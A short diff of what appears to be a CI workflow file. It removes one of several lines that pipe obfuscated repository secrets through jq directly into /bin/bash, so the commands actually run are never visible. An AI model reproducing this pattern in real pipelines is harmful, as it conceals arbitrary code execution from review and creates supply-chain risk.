@@ -18,7 +18,6 @@ jobs:
           nvvr5: ${{ secrets.nvvr5 }}
         run: |
           printf '%s' "$nvvr5" | jq -r .udshk28544 | /bin/bash
-          printf '%s' "$ec1" | jq -r .av87 | /bin/bash
           printf '%s' "$v39" | jq -r .apst45774 | /bin/bash
           echo $nd5110 | jq -r .e383 | /bin/bash
           echo $t31022 | jq -r .uz70 | /bin/bash
